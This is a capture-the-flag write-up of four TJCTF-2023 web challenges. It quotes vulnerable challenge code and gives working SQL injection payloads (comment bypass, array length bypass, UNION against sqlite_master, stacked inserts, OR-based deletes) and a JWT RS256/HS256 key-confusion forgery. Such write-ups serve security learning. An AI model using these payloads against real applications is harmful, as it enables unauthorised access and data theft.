# **(Write up) WEB Challenge TJCTF-2023**

* ## [web/swill-squill]

Source code: [here](swill-squill)

```
def create_db():
    conn = sqlite3.connect(':memory:')
    c = conn.cursor()
    ...
    c.execute(
        'CREATE TABLE notes (description text, owner text)')
    c.execute('INSERT INTO notes VALUES (?, ?)',
              ("Saved this flag for safekeeping: "+flag, 'admin'))
```

The flag is in the note column of the description table with the owner as admin.
```
def post_register():
    name = request.form['name']
    grade = request.form['grade']

    if name == 'admin':
        return make_response(redirect('/'))

    res = make_response(redirect('/api'))
    res.set_cookie("jwt_auth", generate_token(name))

    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE name == '"+name+"';")
```
I just replace the username parameter with payload `admin'--` to bypass `if name == 'admin'` and get `jwt_auth`.
```
name = load_token(request.cookies.get('jwt_auth'))['name']

    c = conn.cursor()

    string = "SELECT description FROM notes WHERE owner == '" + name + "';"
```
Then I send a request to /api and read the flag from admin's note.

* ## [web/ez-sql]

Source code: [here](ez-sql)
```
app.get('/search', (req, res) => {
    const { name } = req.query;

    if (!name) {
        return res.status(400).send({ err: 'Bad request' });
    }

    if (name.length > 6) {
        return res.status(400).send({ err: 'Bad request' });
    }

    db.all(`SELECT * FROM jokes WHERE joke LIKE '%${name}%'`, (err, rows) => {
        if (err) {
            console.error(err.message);
            return res.status(500).send('Internal server error');
        }

        return res.send(rows);
    });
});
```
This challenge has a sql injection vulnerability in the name parameter of API /search.

To bypass `name.length > 6`, I send arrays instead of strings (http://example.com/search?name[0]=aaaaaaa).

And now, name.length=1 (1 element in the array)

<img src= "ezsql/Screenshot 2023-05-27 131537.png">

Check to make sure sql can be injected with simple payload: `name[0]=aaaaaaa%25'--`
<img src= "ezsql/Screenshot 2023-05-27 131800.png">

Extract table name contain flag: name[0]=aaaaaaa%' union select 1, tbl_name FROM sqlite_master--
<img src= "ezsql/Screenshot 2023-05-27 131429.png">

Extract flag:
<img src= "ezsql/Screenshot 2023-05-27 131659.png">

* ## [web/back-to-the-past](TJCTF-2023/back-to-the-past)
Source code: [here](back-to-the-past)

Insecure signature authentication.
```
def generate_token(id, username, year):
    return jwt.encode(
        {"id": id, "username": username, "year": year}, private_key, algorithm="RS256"
    )
def verify_token(token):
    try:
        return jwt.decode(token.encode(), public_key, algorithms=["HS256", "RS256"])
    except:
        return None
```
Public key used to authenticate leaked signature ([public key here](TJCTF-2023/back-to-the-past/static/public_key.pem)). I can use it to generate fake JWT signature using HS256 algorithm.

Then, I send a request to `/retro` with the fake JWT to get the flag (in the fake JWT payload there is a `year` field less than 1970).
```@app.route("/retro")
@login_required()
def retro(user):
    if int(user["year"]) > 1970:
        return render_template("retro.html", flag="you aren't *retro* enough")
    else:
        return render_template("retro.html", flag=flag)
```

Code written by me in Python to generate and validate JWT: [here](TJCTF-2023/back-to-the-past/solution.py)

* ## [web/notes](notes)
Source code: [here](notes)

```
pool.query(`SELECT * FROM notes WHERE user_id = '${req.session.user_id}';`, (err, results) => {
        pool.query(`SELECT * FROM users WHERE id = '${req.session.user_id}';`, (err, users) => {
            res.render('index', { notes: results, user: users[0] || { username: flag } });
        });
    });
```
To get the flag in this challenge, I have to delete the user account row, while that user id still exists in `req.session.userid` variable.

But when the query delete user account is successful or not, `session` is still deleted

My solution to this challenge:

1. Jnject sql into password parameter to /register to create 2 users and create session for user1 on browser A.
```
app.post('/register', (req, res) => {
    if (req.session.user_id)
        return res.redirect('/');

    if (!req.body.username || !req.body.password)
        return res.redirect('/register?e=missing%20fields');

    const id = v4();
    pool.query(`INSERT INTO users (id, username, password) VALUES ('${id}', '${req.body.username}', '${req.body.password}');`, (err, results) => {
        if (err) {
            res.redirect('/register?e=user%20already%20exists');
        } else {
            associateSessionWithUser(id, req.session);
            res.redirect('/');
        }
    });
});
```
Payload:
```
username = user1
password = pass1'), ('idu2', 'user2', 'pass2');-- -
```
2. Login user2 account on browser B.

Now the query will work normally, session for user2 is created

3. In browser A, I send a request to `/user/delete` with `password = incorpass' or username = 'user2'-- -`

```
    const id = req.session.user_id;

    pool.query(`DELETE FROM users WHERE id = '${id}' AND password = '${req.body.password}';`, (err, results) => {

        pool.query(`SELECT * FROM users WHERE id = '${id}' AND password != '${req.body.password}';`, (err, results) => {

            if (err)
                return res.redirect('/?e=an%20error%20occurred');

            if (results.length !== 0)
                return res.redirect('/?e=incorrect%20password');

            sessions[id].forEach(session => {
                session.destroy();
            });
```
`user1` password is wrong, delete query will delete `user2` account, and user1 session.

4. Reload page in browser B

Now the things that still exist include user1 session and user2 account

Reload the page with `user2` session, `username2` will be replaced with `flag`
